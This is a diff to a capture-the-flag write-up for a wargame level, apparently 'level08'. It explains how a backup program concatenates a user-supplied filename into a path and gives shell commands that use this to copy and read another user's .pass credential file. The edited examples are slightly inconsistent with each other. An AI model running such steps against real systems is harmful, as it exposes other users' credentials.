@@ -23,11 +23,11 @@ strncat(local_78, filename, ...);
 
 So if we pass a filename like:
 ```
-home/users/level09/.pass
+/home/users/level09/.pass
 ```
 The final path becomes:
 ```
-./backups/home/users/level09/.pass
+./backups//home/users/level09/.pass
 ```
 
 The program will then open this file, copy its content, and write it into that path under ./backups/.
@@ -38,7 +38,7 @@ The vulnerability here is that the user input (`filename`) is concatenated direc
 To exploit it:
 ```
 cd /tmp
-mkdir -p ./backups/home/users/level09/
+mkdir -p ./backups//home/users/level09/
 ~/level08 home/users/level09/.pass
 cat /tmp/backups/home/users/level09/.pass
 ```
